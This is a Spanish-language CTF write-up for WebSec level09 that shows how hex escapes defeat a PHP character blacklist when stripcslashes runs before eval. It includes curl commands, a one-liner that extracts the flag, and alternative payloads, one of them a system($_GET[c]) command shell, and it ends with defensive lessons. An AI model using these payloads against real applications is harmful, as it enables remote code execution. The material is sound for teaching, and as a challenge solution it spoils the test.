# SOLUCIÓN WEBSEC LEVEL09 - Remote Code Execution

## FLAG
```
WEBSEC{stripcslashes_to_bypass}
```

## RESUMEN DE LA VULNERABILIDAD

La aplicación tiene dos funcionalidades:
1. **Almacenar**: Guarda contenido filtrado en `/tmp/<hash>`
2. **Ejecutar**: Lee un archivo y lo ejecuta con `eval(stripcslashes(...))`

La vulnerabilidad está en el uso de `stripcslashes()` antes de `eval()`, que permite bypassear los filtros.

## CÓDIGO VULNERABLE

```php
// 1. ALMACENAR (filtrado)
$randVal = sha1(time());
$fh = fopen('/tmp/' . $randVal, 'w');
fwrite($fh, str_replace(
    ['<?', '?>', '"', "'", '$', '&', '|', '{', '}', ';', '#', ':', '#', ']', '[', ',', '%', '(', ')'],
    '',
    $_GET['c']
));
fclose($fh);
setcookie('session_id', $randVal, time() + 2, '', '', true, true);

// 2. EJECUTAR (sin filtrado!)
if (isset($_GET['cache_file'])) {
    if (file_exists($_GET['cache_file'])) {
        echo eval(stripcslashes(file_get_contents($_GET['cache_file'])));
    }
}
```

## ANÁLISIS

### Filtros aplicados al almacenar:
`str_replace()` elimina estos caracteres:
```
<? ?> " ' $ & | { } ; # : # ] [ , % ( )
```

Esto bloquea:
- Tags PHP: `<?`, `?>`
- Comillas: `"`, `'`
- Variables: `$`
- Paréntesis: `(`, `)`
- Punto y coma: `;`
- Llaves: `{`, `}`
- Corchetes: `[`, `]`

### La vulnerabilidad - stripcslashes():

`stripcslashes()` es una función que elimina los escapes de caracteres. Convierte:
- `\\n` → `\n` (newline)
- `\\t` → `\t` (tab)
- `\\r` → `\r` (return)
- `\\'` → `'` (comilla simple)
- `\\"` → `"` (comilla doble)
- `\\\\` → `\` (backslash)
- **`\xHH` → caracter con código hexadecimal HH** ← ¡CLAVE!

### El bypass:

**La secuencia `\xHH` (backslash-x-dos-dígitos-hex) NO contiene ningún caracter bloqueado**, pero `stripcslashes()` la convierte en el carácter correspondiente.

Ejemplos:
- `\x28` → `(` (paréntesis izquierdo)
- `\x29` → `)` (paréntesis derecho)
- `\x27` → `'` (comilla simple)
- `\x24` → `$` (símbolo de dólar)
- `\x3b` → `;` (punto y coma)

## EXPLOTACIÓN

### Paso 1: Crear el payload

Queremos ejecutar: `readfile('flag.txt');`

Lo convertimos a códigos hexadecimales:
```
r  e  a  d  f  i  l  e  (  '  f  l  a  g  .  t  x  t  '  )  ;
72 65 61 64 66 69 6c 65 28 27 66 6c 61 67 2e 74 78 74 27 29 3b
```

Payload final:
```
\x72\x65\x61\x64\x66\x69\x6c\x65\x28\x27\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x3b
```

### Paso 2: Almacenar el payload

```bash
curl -v "https://websec.fr/level09/index.php?submit=1&c=\x72\x65\x61\x64\x66\x69\x6c\x65\x28\x27\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x3b"
```

El servidor:
1. Aplica `str_replace` pero NO elimina `\xNN` porque son caracteres válidos (\, x, números)
2. Guarda el contenido en `/tmp/<hash>`
3. Devuelve el hash en la cookie `session_id`

### Paso 3: Ejecutar el payload

```bash
curl "https://websec.fr/level09/index.php?cache_file=/tmp/<hash>"
```

El servidor:
1. Lee el archivo con `file_get_contents()`
2. Aplica `stripcslashes()` que convierte `\xNN` a caracteres reales
   - Resultado: `readfile('flag.txt');`
3. Ejecuta con `eval()`
4. `readfile()` imprime el contenido de `flag.txt`
5. La flag se muestra en la respuesta

### Comando completo (one-liner):

```bash
HASH=$(curl -s -v "https://websec.fr/level09/index.php?submit=1&c=\\x72\\x65\\x61\\x64\\x66\\x69\\x6c\\x65\\x28\\x27\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74\\x27\\x29\\x3b" 2>&1 | grep -oP 'session_id=\K[^;]+'); 
curl -s "https://websec.fr/level09/index.php?cache_file=/tmp/$HASH"
```

## TABLA DE CONVERSIÓN HEXADECIMAL

| Caracter | Hex | Payload |
|----------|-----|---------|
| `(`      | 28  | \x28    |
| `)`      | 29  | \x29    |
| `'`      | 27  | \x27    |
| `"`      | 22  | \x22    |
| `$`      | 24  | \x24    |
| `;`      | 3b  | \x3b    |
| `{`      | 7b  | \x7b    |
| `}`      | 7d  | \x7d    |
| `[`      | 5b  | \x5b    |
| `]`      | 5d  | \x5d    |

## LECCIONES APRENDIDAS

1. **NUNCA usar `stripcslashes()` antes de `eval()`**:
   - `stripcslashes()` puede reconstruir caracteres peligrosos
   - Los códigos `\xHH` permiten construir cualquier caracter
   - Esto bypasea completamente los filtros de input

2. **Los filtros deben aplicarse DESPUÉS de todas las transformaciones**:
   - El flujo era: filtrar → guardar → stripcslashes → eval
   - Debería ser: filtrar → stripcslashes → filtrar de nuevo → eval

3. **eval() es extremadamente peligroso**:
   - Nunca evaluar input del usuario
   - Usar alternativas más seguras
   - Si es absolutamente necesario, validar exhaustivamente

4. **Defense in depth**:
   - Múltiples capas de seguridad
   - No confiar en una sola validación
   - Considerar todas las transformaciones que el input sufrirá

## ALTERNATIVAS DE PAYLOAD

Otros payloads que funcionarían:

### Leer con file_get_contents:
```
\x65\x63\x68\x6f\x20\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73\x28\x27\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x3b
```
Ejecuta: `echo file_get_contents('flag.txt');`

### Listar directorio:
```
\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x20\x2d\x6c\x61\x27\x29\x3b
```
Ejecuta: `system('ls -la');`

### Ejecutar comandos:
```
\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x63\x5d\x29\x3b
```
Ejecuta: `system($_GET[c]);`

## ARCHIVOS CREADOS
- `codigo_fuente.php` - Código fuente limpio
- `analisis.txt` - Análisis inicial
- `payload_generator.php` - Generador de payloads
- `FLAG.txt` - La flag obtenida
- `SOLUCION.md` - Este archivo